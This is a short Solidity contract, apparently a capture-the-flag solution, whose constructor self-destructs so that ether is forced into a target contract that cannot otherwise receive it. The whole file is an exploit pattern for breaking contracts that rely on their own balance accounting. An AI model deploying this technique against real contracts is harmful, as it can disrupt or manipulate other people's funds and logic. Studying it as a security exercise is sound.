pragma solidity ^0.8.0;

contract ForceHack {
    constructor(address payable catAddress) payable {
        selfdestruct(catAddress);
    }
}
